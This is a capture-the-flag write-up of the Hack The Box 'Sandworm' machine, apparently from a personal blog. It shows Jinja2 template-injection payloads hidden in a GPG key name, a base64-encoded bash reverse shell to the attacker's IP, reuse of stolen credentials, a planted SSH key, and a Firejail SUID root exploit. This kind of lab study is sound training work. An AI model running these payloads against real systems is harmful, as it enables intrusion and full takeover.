---
title: Hack The Box - Sandworm
date: 2024-06-21 13:33:37 +0200
categories:
  - HackTheBox
tags:
  - HTB
comments: true
---

HTB Sandworm Machine - https://www.hackthebox.com/machines/sandworm


### Scanning & Enumeration
Scan the machine with Nmap tool
```
nmap -p- -sC -sV --min-rate 5000 -oN nmappc -Pn 10.10.11.218
```

![](/assets/img/posts/Pasted%20image%2020260820075359.png)

Found a hostname `ssa.htb` , so add it to the: `/etc/hosts` file
	`10.10.11.218 ssa.htb`

Lets navigate to it. Nothing Interesting here in this Page. 

![](/assets/img/posts/Pasted%20image%2020260820085836.png)

So I start to look for hidden directories/files a with common wordlist.
```
gobuster dir -u https://ssa.htb/ -w /usr/share/dirb/wordlists/common.txt -k
```

I found `admin` page but no Credentials. and I found `guide` page Interesting.

### Exploitation & Gaining Access
There is a **Public Key** and **Signed Text** field. It takes **gpg key value** and **signed text** verified with that Key and it will Verify Signature.

![](/assets/img/posts/Pasted image 20250816235636.png)

So now we have to generate a gpg key with command line.
```
gpg --gen-key
```

#### First Try
Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put `{{7*7}}` payload in the name field. If it is vulnerable then it will give output `49` as a name.

```
Real name: {{7*7}}
Email: anymail
password: A1234567
```

Checking all generate Keys.
```
gpg --list-key
```

Go to this path, which have the certificates
```
cd /.gnupg/openpgp-revocs.d
cat 21DE3262BD598ED0207F23FC61EAF7F8CB468B5B.rev
```

To make our Public Key with the following command for Encryption
```
gpg --armor --export abdo@gmail.com > public_key.asc
```

Make our signed key to Encrypt our Message that we will put in Input Field as Signed Text
```
echo "Test" > message.txt
gpg --clear-sign --output signed_message.asc messsage.txt
password: A1234567
```

This is my Public Key:

![](/assets/img/posts/Pasted%20image%2020260820090812.png)


This is my Signed Text:

![](/assets/img/posts/Pasted%20image%2020260820090855.png)

After putting this two Content into the Proper Field I press on Verify Signature and I found this below.

![](/assets/img/posts/Pasted image 20250816235814.png)

I found **49** It is **jinja2** template engine. So it worked and it is exploitable.

Then I use `id` to see what user are there in that message using Previous Method. Before we have to delete the Previous Keys.
```
gpg --delete-secret-keys abdo@gmail.com
gpg --delete-keys abdo@gmail.com
gpg --list-key
```

Then I again generate keys but this time the payload will be different. In the name field I put this payload below:
```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### Second Try

```
gpg --gen-key
Real name: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
Email: abdo@gmail.com
password: A1234567
```

Then we have to make our **Public Key** with the following command for Encryption.
```
gpg --armor --export abdo@gmail.com > public_key.asc
```

Then we have to make our signed key to encrypt our message that we will put in input field as **Signed Text**.
```
echo "Test" > message.txt
gpg --clear-sign --output signed_message.asc message.txt
Password: A1234567
```

After making and putting those in input field I get the UID of user `atlas`.
![](/assets/img/posts/Pasted image 20250817000027.png)

Then I change the `id` command with a reverse shell command but it shows Error. Not supporting `< >`.

![](/assets/img/posts/Pasted%20image%2020260820091504.png)

Removing the previous keys
```
gpg --delete-secret-keys abdo@gmail.com
gpg --delete-keys abdo@gmail.com
gpg --list-key
```

So I encoded it with base64 and put it in there, and it worked Perfectly.
```
echo "bash -i >& /dev/tcp/10.10.16.17/4444 0>&1" | base64
```
Result: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK`

The final payload:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK" | base64 -d | bash').read() }}
```

First, make our listener
```
nc -nvlp 4444
```

#### Third Try

```
gpg --gen-key
Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}

Email: abdo@gmail.com
password: A1234567 Admin123
```

Then we have to make our Public Key with the following command for Encryption
```
gpg --armor --export abdo@gmail.com > public_key.asc
```

Then we have to make our signed key to encrypt our message that we will put in input field as signed text
```
echo "Test" > message.txt
gpg --clear-sign --output signed_message.asc message.txt
password: A1234567
```

We got a shell on our listener!

### Privilege Escalation
#### Enumerating the Target
Doing some enumeration, and exploration
```
atlas@ssandworm:~$ cd /home
atlas@ssandworm:~$ ls -lah
atlas@ssandworm:~$ cd .config
atlas@ssandworm:~$ ls -lah
atlas@ssandworm:~$ cd httpie
atlas@ssandworm:~$ ls -lah
atlas@ssandworm:~$ cd sessions
atlas@ssandworm:~$ ls -lah
atlas@ssandworm:~$ cd localhost_5000
```

We will finally arrived to this file
```
cat admin.json
```

![](/assets/img/posts/Pasted%20image%2020260820092658.png)


So now we have a username, and  a password

Lets use them to login via SSH
```
ssh silentobserver@10.10.11.218
Password: quietLiketheWind22

silentobserver@sandworm:~$ whoami
silentobserver@sandworm:~$ ls
silentobserver@sandworm:~$ cat user.txt
```

#### 1- Using pspy Script
We will use `pspy` script to see if there anything we can use it to get to the root, but first lets download it to the HTB machine

First, from our machine
```
python -m SimpleHTTPServer
```

Second, from the HTB machine
```
wget 10.10.16.17:8000/pspy64
```

We will found `/opt/tipnet` service running, so I get into that folder.
```
silentobserver@sandworm:~$ cd /opt/tipnet
silentobserver@sandworm:~$ cd target
silentobserver@sandworm:~$ cd target
silentobserver@sandworm:~$ cd debug
silentobserver@sandworm:~$ ls -lah
silentobserver@sandworm:~$ cat tipnet.d
```

![](/assets/img/posts/Pasted%20image%2020260820095823.png)

I found one of them has write Access. So I change the code with some shell code: https://doc.rust-lang.org/std/process/struct.Command.html
```
use std::process::Command;  
let output = Command::new("bash")  
.arg("-c")  
.arg("<shell_code>")  
.output()  
.expect("failed to execute process")
```

![](/assets/img/posts/Pasted%20image%2020260820100111.png)

Setting our netcat listener, and get shell again with `Atlas` User.

Here in `.ssh` folder I put my own `id_rsa.pub `file and rename it again with `authorized_keys` , then I use my own `id_rsa` to login as Atlas User.

![](/assets/img/posts/Pasted%20image%2020260820100407.png)

#### 2- Using linpeas.sh Script
This time we will use `linpeas.sh` script to see if there anything we can use it to get to the root, but first lets download it to the HTB machine

First, from our machine
```
python -m SimpleHTTPServer
```

Second, from the HTB machine
```
silentobserver@sandworm:~$ wget 10.10.16.17:8000/linpeas.sh
```

When I run linpeas.sh I found the following interesting file.

![](/assets/img/posts/Pasted image 20250817000428.png)

It has SUID permission. So we can use that for Exploitation. I search in **Google** for `Firejail exploit.` , I found this: https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25

copy and paste it in our shell as explot.py, and gave to it
```
silentobserver@sandworm:~$ mousepad fire-explit.py
silentobserver@sandworm:~$ chmod +x fire-explit.py
silentobserver@sandworm:~$ python3 fire-explit.py
```

![](/assets/img/posts/Pasted%20image%2020260820095203.png)

So I again open a shell as `atlas` user using SSH and `id_rsa`. And type the following command
```
atlas@sandworm:/opt/tipnet$ firejail --join=24654
atlas@sandworm:/opt/tipnet$ su -
root@sandworm:~#
root@sandworm:~# cd /root
root@sandworm:~# cat root.txt
```
